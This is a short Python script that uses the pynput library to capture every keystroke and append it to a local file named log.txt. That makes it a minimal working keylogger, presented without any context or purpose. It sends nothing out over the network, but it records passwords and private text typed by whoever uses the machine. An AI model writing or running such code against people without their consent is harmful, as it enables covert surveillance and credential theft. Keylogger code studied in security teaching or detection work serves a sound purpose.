from pynput import keyboard

filename = 'log.txt'

def get_char(key):
    try:
        return key.char
    except AttributeError:
        return str(key)

def on_press(key):
    print(key)
    with open(filename, 'a') as log:
        log.write(get_char(key))

listener = keyboard.Listener(on_press=on_press)
listener.start()

input()